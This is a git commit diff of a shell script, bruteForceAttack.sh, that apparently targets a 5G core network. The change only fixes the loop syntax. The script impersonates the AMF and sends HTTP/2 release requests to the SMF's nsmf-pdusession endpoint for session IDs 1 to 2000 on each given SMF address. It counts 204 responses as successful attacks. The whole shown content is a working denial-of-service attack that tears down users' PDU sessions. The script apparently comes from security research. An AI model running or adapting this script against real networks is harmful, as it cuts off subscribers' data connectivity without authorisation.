3ca1849947fccd7677b87384f809c460dad64023
UmakantKulkarni <UmakantKulkarni@users.noreply.github.com>
2024-05-15 13:01:54 -0400

    Update bruteForceAttack.sh

--- bruteForceAttack.sh
+++ bruteForceAttack.sh
@@ -4,6 +4,7 @@ END=2000
 for i in $(seq 1 $END);
 do
     for smf_ip in "$@"
+    do
         # Execute from AMF node:
         op=$(curl -s -o /dev/null -w "%{http_code}" --request POST -d '{"ueLocation":{"nrLocation":{"tai":{"plmnId":{"mcc":"208","mnc":"93"},"tac":"000001"},"ncgi":{"plmnId":{"mcc":"208","mnc":"93"},"nrCellId":"000000010"},"ueLocationTimestamp":"2022-11-30T03:19:48.206301Z"}},"ueTimeZone":"-05:00"}' -H "Content-Type: application/json" --http2-prior-knowledge  -A "AMF" http://$smf_ip/nsmf-pdusession/v1/sm-contexts/$i/release)
         if [ "$op" = "204" ]; then
@@ -16,5 +17,6 @@ do
             j=$[j+1]
             #break
         fi
+    done
 done
 #echo "Total successful attacks = $j"
